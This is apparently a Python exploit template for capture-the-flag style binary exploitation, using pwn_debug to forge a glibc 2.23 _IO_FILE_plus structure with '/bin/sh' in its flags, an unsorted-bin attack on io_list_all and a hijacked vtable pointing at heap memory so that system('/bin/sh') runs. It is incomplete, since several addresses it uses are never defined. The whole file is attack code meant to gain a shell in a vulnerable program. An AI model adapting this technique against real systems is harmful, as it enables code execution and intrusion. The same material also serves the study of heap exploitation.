# File: IO_FILE_vtable_hack.py
# Author: raycp
# Date: 2019-06-01
# Description: template for vtable hajacking

from pwn_debug import *


pdbg=pwn_debug("./binary")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc


def pwn():

	#pdbg.bp([])

    fake_file=IO_FILE_plus()
    fake_file._flags=u64('/bin/sh\x00')         #parameter
    fake_file._IO_read_ptr=0x61                 # size of chunk 0x60
    fake_file._IO_read_end=unsorted_addr        #unsorted linst
    fake_file._IO_read_base=io_list_all-0x10    #unsorted bin attack
    fake_file._IO_write_ptr=1
    fake_file._IO_write_base=0
   
    fake_vatble=heap_addr                       # vtable addr should store system address                 
    fake_file.vtable=fake_vatble

    fake_file.show()
    fake_file.orange_check()
    file_data=str(fake_file)
   
    # hajack to execute system(binsh)
    
    p.interactive() 

if __name__ == '__main__':
    pwn()


